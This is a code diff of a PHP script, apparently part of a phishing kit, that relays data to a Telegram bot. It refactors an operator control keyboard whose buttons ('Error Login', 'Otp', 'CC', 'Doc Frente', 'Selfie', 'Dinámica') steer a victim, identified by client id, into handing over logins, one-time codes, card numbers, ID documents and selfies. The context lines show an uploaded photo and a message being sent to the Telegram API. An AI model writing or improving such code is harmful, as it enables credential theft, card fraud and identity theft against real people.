@@ -64,36 +64,9 @@ if ($tgData && $tgData['ok'] && isset($tgData['result']['photo'])) {
 
 @unlink($tmpFile);
 
-// Enviar botones de acción
-$keyboard = [
-    'inline_keyboard' => [
-        [
-            ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$cliente_id"],
-            ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$cliente_id"],
-        ],
-        [
-            ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$cliente_id"],
-            ['text' => '💳 CC',         'callback_data' => "cmd_5_$cliente_id"],
-        ],
-        [
-            ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$cliente_id"],
-            ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$cliente_id"],
-        ],
-        [
-            ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$cliente_id"],
-            ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$cliente_id"]
-        ],
-        [
-            ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$cliente_id"],
-            ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$cliente_id"]
-        ],
-        [
-            ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$cliente_id"],
-            ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$cliente_id"],
-            ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$cliente_id"]
-        ]
-    ]
-];
+// Enviar botones de acción centralizados
+require_once __DIR__ . '/../../config/telegram_keyboard.php';
+$keyboard = getTelegramKeyboard($cliente_id, $config);
 
 $ch2 = curl_init("https://api.telegram.org/bot$botToken/sendMessage");
 curl_setopt($ch2, CURLOPT_POST, 1);
